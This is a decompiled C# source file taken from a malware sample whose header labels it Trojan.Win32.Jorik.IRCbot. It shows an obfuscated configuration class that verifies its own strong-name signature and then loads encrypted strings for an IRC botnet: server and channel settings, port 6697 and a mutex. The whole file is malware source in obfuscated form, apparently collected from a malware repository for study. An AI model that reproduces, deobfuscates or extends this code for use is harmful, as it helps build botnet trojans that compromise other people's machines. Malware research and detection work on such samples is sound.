// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u000F;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u000F
{
  internal sealed class \u0001
  {
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static string \u0007;
    public static string \u0008;
    public static string \u000E;
    public static Mutex \u0001;
    public static string \u000F;
    public static bool \u0001;
    public static bool \u0002;
    public static string[] \u0001;
    public static int[] \u0001;
    public static string[] \u0002;
    public static string \u0010;
    public static string \u0011;
    public static string \u0012;
    public static string \u0013;
    public static string \u0014;
    public static string \u0015;
    [NonSerialized]
    internal static \u0008.\u0004 \u0080;

    public static string \u0001()
    {
      string str = \u0082.\u0091\u0002(\u0081.\u007E\u008F\u0002((object) \u0080.\u008A\u0002(), \u0001.\u0004));
      return \u001D.\u007E\u0084\u0002((object) str, 0, \u0019.\u007E\u001C\u0002((object) str) / 2);
    }

    static \u0001()
    {
      \u0005.\u0001(typeof (\u0001));
      int num = 0;
      if (num == 0)
        goto label_6;
label_1:
      Assembly assembly;
      if (num != 0 && \u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0001.\u0080(601)))
      {
        \u0001.\u0001 = \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) \u0006.\u0086()));
        \u0001.\u0002 = \u0002.\u0001(7);
        \u0001.\u0003 = \u0002.\u0001();
        \u0001.\u0004 = \u0002.\u0002(\u0001.\u0001);
        string[] strArray;
        if (true)
        {
          \u0001.\u0005 = \u0001.\u0080(663);
          \u0001.\u0006 = \u0001.\u0080(672);
          \u0001.\u0007 = \u0001.\u0002;
          \u0001.\u0008 = \u001D.\u007E\u0084\u0002((object) \u0082.\u0091\u0002(\u0081.\u007E\u008F\u0002((object) \u0080.\u008A\u0002(), \u0001.\u0002)), 0, 5);
          \u0001.\u000E = global::\u0004.\u001C(\u0001.\u0080(281));
          \u0001.\u000F = \u0001.\u0080(681);
          \u0001.\u0001 = false;
          \u0001.\u0002 = true;
          strArray = new string[1]{ \u0001.\u0080(694) };
        }
        \u0001.\u0001 = strArray;
        \u0001.\u0001 = new int[1]{ 6697 };
        \u0001.\u0002 = new string[1]
        {
          \u0001.\u0080(723)
        };
        \u0001.\u0010 = \u0001.\u0080(732);
        \u0001.\u0011 = \u0001.\u0080(741);
        \u0001.\u0012 = \u0001.\u0080(758);
        \u0001.\u0013 = \u0001.\u0080(767);
        \u0001.\u0014 = \u0001.\u0080(776);
        \u0001.\u0015 = \u0001.\u0080(793);
        return;
      }
label_2:
      throw new SecurityException(\u0001.\u0080(626));
label_6:
      bool flag = num != 0;
      assembly = \u007F.\u0089\u0002();
      if (\u0001.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
      {
        num = flag ? 1 : 0;
        goto label_1;
      }
      else
        goto label_2;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
